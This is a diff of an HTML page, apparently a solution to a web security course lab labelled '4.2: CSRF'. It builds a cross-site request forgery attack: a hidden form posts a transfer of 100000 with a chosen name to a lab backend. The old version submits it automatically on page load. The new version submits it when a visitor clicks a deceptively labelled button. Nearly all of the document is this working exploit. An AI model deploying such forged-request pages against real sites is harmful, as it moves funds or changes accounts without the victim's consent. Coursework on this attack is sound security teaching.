@@ -1,19 +1,15 @@
-<!DOCTYPE html>
 <html>
   <head>
-    <title>CSRF Attack</title>
+    <title>4.2: CSRF</title>
     <meta name="referrer" content="no-referrer">
   </head>
-  <body style="padding: 50px; font-family: sans-serif;">
-    
-    <h3>Processing Gift...</h3>
+
+  <body>
+    <button onclick="runCSRFAttack()">Totally inconspicuous button that you should click</button>
 
     <form
-      id="attack-form"
-      method="POST"
-      action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo"
-      target="_blank"
-    >
+      id="attack-form" method="POST" action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo" >
+      
       <input type="hidden" name="amount" value="100000">
       <input type="hidden" name="comment" value="CSRF Attack">
       <input type="hidden" name="fname" value="Surya">
@@ -21,9 +17,9 @@
     </form>
 
     <script>
-      // Submit automatically
-      document.getElementById("attack-form").submit();
+      function runCSRFAttack() {
+        document.getElementById("attack-form").submit();
+      }
     </script>
-
   </body>
 </html>
